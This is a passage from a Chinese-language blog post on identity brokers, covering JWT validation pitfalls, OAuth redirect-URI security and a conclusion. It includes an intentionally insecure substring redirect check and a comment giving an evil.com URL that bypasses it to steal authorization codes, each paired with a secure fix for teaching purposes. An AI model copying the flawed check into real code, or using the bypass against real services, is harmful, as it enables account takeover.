<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 驗證失敗</p><div class="admonition-content"><p><strong>缺少簽章驗證</strong></p>
<ul>
<li>攻擊者可以建立假權杖</li>
<li>沒有加密驗證</li>
<li>完全繞過身份驗證</li>
</ul>
<p><strong>缺少過期檢查</strong></p>
<ul>
<li>過期的權杖仍然被接受</li>
<li>被竊的權杖無限期有效</li>
<li>沒有基於時間的安全性</li>
</ul>
<p><strong>缺少受眾驗證</strong></p>
<ul>
<li>接受來自其他應用程式的權杖</li>
<li>跨應用程式權杖重複使用</li>
<li>權限提升風險</li>
</ul>
</div></div>
<p>適當的權杖驗證：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：完整的權杖驗證</span>
<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt<span class="token punctuation">,</span> JWTError

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
            token<span class="token punctuation">,</span>
            key<span class="token operator">=</span>get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># 指定允許的演算法</span>
            audience<span class="token operator">=</span><span class="token string">'my-application'</span><span class="token punctuation">,</span>  <span class="token comment"># 驗證受眾</span>
            issuer<span class="token operator">=</span><span class="token string">'https://broker.example.com'</span>  <span class="token comment"># 驗證頒發者</span>
        <span class="token punctuation">)</span>
        
        <span class="token comment"># 權杖有效且已驗證</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
        
    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'權杖已過期'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTClaimsError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'無效的聲明'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span>
    <span class="token keyword">except</span> JWTError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'無效的權杖'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
<h3 id="陷阱-3：不安全的重新導向-URI">陷阱 3：不安全的重新導向 URI</h3>
<p>OAuth 2.0 重新導向 URI 驗證對於安全性至關重要：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 不安全：弱重新導向 URI 驗證</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 弱驗證：子字串比對</span>
    <span class="token keyword">if</span> <span class="token string">'example.com'</span> <span class="token keyword">in</span> redirect_uri<span class="token punctuation">:</span>
        <span class="token comment"># 產生授權碼</span>
        code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> <span class="token string">"無效的重新導向 URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>

<span class="token comment"># 攻擊者可以使用：https://evil.com?victim=example.com</span>
<span class="token comment"># 驗證通過，授權碼發送給攻擊者！</span></code></pre>
<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 重新導向 URI 漏洞</p><div class="admonition-content"><p><strong>開放重新導向</strong></p>
<ul>
<li>授權碼發送給攻擊者</li>
<li>可能的帳戶接管</li>
<li>啟用網路釣魚攻擊</li>
</ul>
<p><strong>子網域攻擊</strong></p>
<ul>
<li>弱驗證允許子網域</li>
<li>攻擊者註冊惡意子網域</li>
<li>竊取授權碼</li>
</ul>
</div></div>
<p>安全的重新導向 URI 驗證：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ✅ 安全：嚴格的重新導向 URI 驗證</span>
REGISTERED_CLIENTS <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'client123'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
        <span class="token string">'redirect_uris'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
            <span class="token string">'https://app.example.com/callback'</span><span class="token punctuation">,</span>
            <span class="token string">'https://app.example.com/oauth/callback'</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oauth/authorize'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">authorize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    client_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client_id'</span><span class="token punctuation">)</span>
    redirect_uri <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'redirect_uri'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 與註冊的 URI 精確比對</span>
    client <span class="token operator">=</span> REGISTERED_CLIENTS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> client <span class="token keyword">or</span> redirect_uri <span class="token keyword">not</span> <span class="token keyword">in</span> client<span class="token punctuation">[</span><span class="token string">'redirect_uris'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"無效的重新導向 URI"</span><span class="token punctuation">,</span> <span class="token number">400</span>
    
    code <span class="token operator">=</span> generate_auth_code<span class="token punctuation">(</span>client_id<span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>redirect_uri<span class="token punctuation">}</span></span><span class="token string">?code=</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
<h2 id="結論">結論</h2>
<p>身份代理在分散式系統中集中管理身份驗證，提供單一登入、協定轉換和統一的身份管理。然而，實作選擇會顯著影響安全性、效能和使用者體驗。</p>
<p>基於權杖和基於工作階段的身份驗證之間的選擇涉及基本權衡。基於權杖的身份驗證提供無狀態可擴展性和微服務相容性，但在撤銷和安全風險方面存在困難。基於工作階段的身份驗證提供立即撤銷和細粒度控制，但引入了可擴展性複雜性。使用短期存取權杖和伺服器端重新整理權杖的混合方法代表了業界最佳實務，平衡了安全性、效能和使用者體驗。</p>
<p>協定選擇取決於您的環境和要求。OpenID Connect 是新應用程式的現代標準，提供簡單的整合、行動支援和專為身份驗證而建構的功能。儘管複雜，SAML 對於企業整合和傳統系統仍然至關重要。OAuth 2.0 服務於授權需求，但需要 OpenID Connect 才能進行適當的身份驗證。</p>
<p>常見陷阱困擾著身份代理實作。在本地儲存中儲存權杖會產生 XSS 漏洞——改用 HTTP-only cookie。缺少權杖驗證允許攻擊者偽造權杖——始終驗證簽章、過期、受眾和頒發者。弱重新導向 URI 驗證使授權碼被竊——對註冊的 URI 使用精確比對。</p>
<p>身份代理是現代分散式系統的基本基礎設施，但它們需要仔細實作。理解身份驗證方法之間的權衡、選擇適當的協定以及避免常見的安全陷阱可確保您的身份代理增強而不是破壞您的安全態勢。複雜性是合理的，因為它帶來了好處：統一的身份驗證、改進的使用者體驗以及整個應用程式生態系統的集中安全控制。</p>
<!-- commentbox plugin begins -->
    <div class="commentbox"></div>
    <script src="https://unpkg.com/commentbox.io/dist/commentBox.min.js"></script>
    <script>commentBox('5765834504929280-proj')</script>
    <!-- commentbox plugin ends -->
    
        </div>
        <footer class="article-footer">
            
    <a data-url="https://neo01.com/zh-TW/2021/12/Identity-Broker-Patterns/" data-id="5f4eb6cf" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
<script>
    (function ($) {
        $('body').on('click', function() {
            $('.article-share-box.on').removeClass('on');
        }).on('click', '.article-share-link', function(e) {
            e.stopPropagation();

            var $this = $(this),
                url = $this.attr('data-url').replace("http://","https://"),
                encodedUrl = encodeURIComponent(url),
                id = 'article-share-box-' + $this.attr('data-id'),
                offset = $this.offset(),
                box;

            if ($('#' + id).length) {
                box = $('#' + id);

                if (box.hasClass('on')){
                    box.removeClass('on');
                    return;
                }
            } else {
                var html = [
                    '<div id="' + id + '" class="article-share-box">',
                        '<input class="article-share-input" value="' + url + '">',
                        '<div class="article-share-links">',
                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
                        '</div>',
                    '</div>'
                ].join('');

              box = $(html);

              $('body').append(box);
            }

            $('.article-share-box.on').hide();

            box.css({
                top: offset.top + 25,
                left: offset.left
            }).addClass('on');

        }).on('click', '.article-share-box', function (e) {
            e.stopPropagation();
        }).on('click', '.article-share-box-input', function () {
            $(this).select();
        }).on('click', '.article-share-box-link', function (e) {
            e.preventDefault();
            e.stopPropagation();

            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
        });
    })(jQuery);
</script>

        </footer>
    </div>
    <!--script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "author": {
            "@type": "Person",
            "name": "Neo Alienson"
        },
        "headline": "身份代理：分散式系統中的集中式身份驗證",
        "image": "https://neo01.com",
        "keywords": "Architecture Authentication Security",
        "genre": "Development",
        "datePublished": "2021-12-24",
        "dateCreated": "2021-12-24",
        "dateModified": "2025-10-23",
        "url": "https://neo01.com//zh-TW/2021/12/Identity-Broker-Patterns/",
        "description": "身份代理在多個系統中集中管理身份驗證，但實作選擇會影響安全性、效能和使用者體驗。了解模式、權衡和陷阱。",
        "wordCount": 5414
    }
</script-->

</article>

                        </div>
                    </section>
                    <aside id="sidebar">
    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
    <div class="sidebar-top">
        <p>追蹤 :</p>
        <ul class="social-links">
                <li>
                    <a class="social-tooltip" title="stack-exchange" href="https://stackexchange.com/users/2122053/neo?tab=accounts" target="_blank" rel="noopener">
                        <i class="icon fa-brands fa-stack-exchange"></i>
                    </a>
                </li>
                <li>
                    <a class="social-tooltip" title="stack-overflow" href="https://stackoverflow.com/users/1885105/neo" target="_blank" rel="noopener">
                        <i class="icon fa-brands fa-stack-overflow"></i>
                    </a>
                </li>
                <li>
                    <a class="social-tooltip" title="github" href="https://github.com/neoalienson" target="_blank" rel="noopener">
                        <i class="icon fa-brands fa-github"></i>
                    </a>
                </li>
                <li>
                    <a class="social-tooltip" title="linkedin" href="https://linkedin.com/in/neo01" target="_blank" rel="noopener">
                        <i class="icon fa-brands fa-linkedin"></i>
                    </a>
                </li>
                <li>
                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank" rel="noopener">
                        <i class="icon fa fa-rss"></i>
                    </a>
                </li>
        </ul>
    </div>
    <div class="widgets-container">
        
            
                <div class="widget-wrap widget-list">
    <h3 class="widget-title">連結</h3>
    <div class="widget">
        <ul><li><a href="/zh-TW/ai">AI 遊樂場</a></li><li><a href="/zh-TW/tools">工具</a></li><li><a href="/zh-TW/games">遊戲</a></li><li><a href="/zh-TW/pages/useful-information">實用資訊</a></li><li><a href="/zh-TW/pages/Hexo-Blogging-Cheatsheet">Hexo 部落格速查表</a></li></ul>
    </div>
</div>

            
                
            
                    <div class="widget-wrap">
        <h3 class="widget-title">最新文章</h3>
        <div class="widget">
            <ul id="recent-post" class="">
                    <li>
                        <div class="item-thumbnail">
                            <a href="/zh-TW/2025/10/How-I-Use-AI-to-Learn/" class="thumbnail">
        <span style="background-image:url(/assets/learning/thumbnail_80.png)" alt="我如何使用 AI 學習：透過迭代知識建構的個人旅程" class="thumbnail-image"></span>
</a>
                        </div>
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/zh-TW/categories/AI/">人工智慧</a></p>
                            <p class="item-title"><a href="/zh-TW/2025/10/How-I-Use-AI-to-Learn/" class="title">我如何使用 AI 學習：透過迭代知識建構的個人旅程</a></p>
                            <p class="item-date"><time datetime="2025-10-18T16:00:00.000Z" itemprop="datePublished">2025-10-19</time></p>
                        </div>
                    </li>
                    <li>
                        <div class="item-thumbnail">
                            <a href="/zh-TW/2025/10/Tools-Games-And-Browser-Built-In-AI/" class="thumbnail">
        <span style="background-image:url(/2025/10/Tools-Games-And-Browser-Built-In-AI/thumbnail.jpeg)" alt="工具、遊戲與瀏覽器內建 AI 遊樂場" class="thumbnail-image"></span>
</a>
                        </div>
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/zh-TW/categories/AI/">人工智慧</a></p>
                            <p class="item-title"><a href="/zh-TW/2025/10/Tools-Games-And-Browser-Built-In-AI/" class="title">工具、遊戲與瀏覽器內建 AI 遊樂場</a></p>
                            <p class="item-date"><time datetime="2025-10-01T16:00:00.000Z" itemprop="datePublished">2025-10-02</time></p>
                        </div>
                    </li>
                    <li>
                        <div class="item-thumbnail">
                            <a href="/zh-TW/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/" class="thumbnail">
        <span style="background-image:url(/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/thumbnail.jpeg)" alt="代理式編碼的崛起：AI 驅動的軟體工程" class="thumbnail-image"></span>
</a>
                        </div>
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/zh-TW/categories/AI/">人工智慧</a></p>
                            <p class="item-title"><a href="/zh-TW/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/" class="title">代理式編碼的崛起：AI 驅動的軟體工程</a></p>
                            <p class="item-date"><time datetime="2025-09-19T16:00:00.000Z" itemprop="datePublished">2025-09-20</time></p>
                        </div>
                    </li>
                    <li>
                        <div class="item-thumbnail">
                            <a href="/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part2/" class="thumbnail">
        <span style="background-image:url(/assets/ports/thumbnail.png)" alt="理解臨時埠 Part 2：為什麼伺服器應用程式應避免使用動態埠" class="thumbnail-image"></span>
</a>
                        </div>
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/zh-TW/categories/Development/">開發</a></p>
                            <p class="item-title"><a href="/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part2/" class="title">理解臨時埠 Part 2：為什麼伺服器應用程式應避免使用動態埠</a></p>
                            <p class="item-date"><time datetime="2025-08-30T16:00:00.000Z" itemprop="datePublished">2025-08-31</time></p>
                        </div>
                    </li>
                    <li>
                        <div class="item-thumbnail">
                            <a href="/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part1/" class="thumbnail">
        <span style="background-image:url(/assets/ports/thumbnail.png)" alt="理解臨時埠：網路通訊的隱形工作者" class="thumbnail-image"></span>
</a>
                        </div>
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/zh-TW/categories/Development/">開發</a></p>
                            <p class="item-title"><a href="/zh-TW/2025/08/Understanding_Ephemeral_Ports_Part1/" class="title">理解臨時埠：網路通訊的隱形工作者</a></p>
                            <p class="item-date"><time datetime="2025-08-29T16:00:00.000Z" itemprop="datePublished">2025-08-30</time></p>
                        </div>
                    </li>
            </ul>
        </div>
    </div>

            
                
    
    
    <div class="widget-wrap widget-list">
        <h3 class="widget-title">所有文章</h3>
        <div class="widget">
            <ul class="archive-list">
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2025/">2025</a>
                    <span class="archive-list-count">14</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2024/">2024</a>
                    <span class="archive-list-count">25</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2023/">2023</a>
                    <span class="archive-list-count">15</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2022/">2022</a>
                    <span class="archive-list-count">10</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2021/">2021</a>
                    <span class="archive-list-count">12</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2020/">2020</a>
                    <span class="archive-list-count">13</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2019/">2019</a>
                    <span class="archive-list-count">12</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2018/">2018</a>
                    <span class="archive-list-count">2</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2017/">2017</a>
                    <span class="archive-list-count">5</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2016/">2016</a>
                    <span class="archive-list-count">4</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2015/">2015</a>
                    <span class="archive-list-count">6</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2014/">2014</a>
                    <span class="archive-list-count">7</span>
                </li>
            
                <li class="archive-list-item">
                    <a class="archive-list-link" href="/zh-TW/archives/2013/">2013</a>
                    <span class="archive-list-count">2</span>
                </li>
            
            </ul>
        </div>
    </div>


            
        
    </div>
</aside>

                </div>
            </div>
        </div>
        <!-- disable caching cause each page has different footer from qrcode -->
        <!-- common/footer, null, {cache: !config.relative_link})  -->
        <footer id="footer">
    <div class="container">
        <div class="container-inner">
            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
            <div class="qrcode-share-wrapper">
                <div class="qrcode-text">https://neo01.com/l#aedb71b9</div>
                <img src="/qr/qr-f9a6841b5df85bb6aa992f5d15e788d0.svg" width="200" height="200" alt="QR Code for https://neo01.com/l#aedb71b9">
            </div>
            <div class="credit">
                <h1 class="logo-wrap">
                    <a href="/" title="Homepage" class="logo"></a>
                </h1>
                
                <p>© 2025 Neo Alienson. 版權所有.
                  <a href="/zh-TW/terms-and-conditions">使用條款</a></p>
                
            </div>
            <div class="footer-plugins">
              


            </div>
        </div>
    </div>
</footer>

        
    
        


        


        


        


        


        


        


        


        


    



<!-- Custom Scripts -->




    </div>
<!-- hexo injector body_end start --><script type="text/javascript" src="/js/bundle_last.js"></script><!-- hexo injector body_end end -->

</body></html>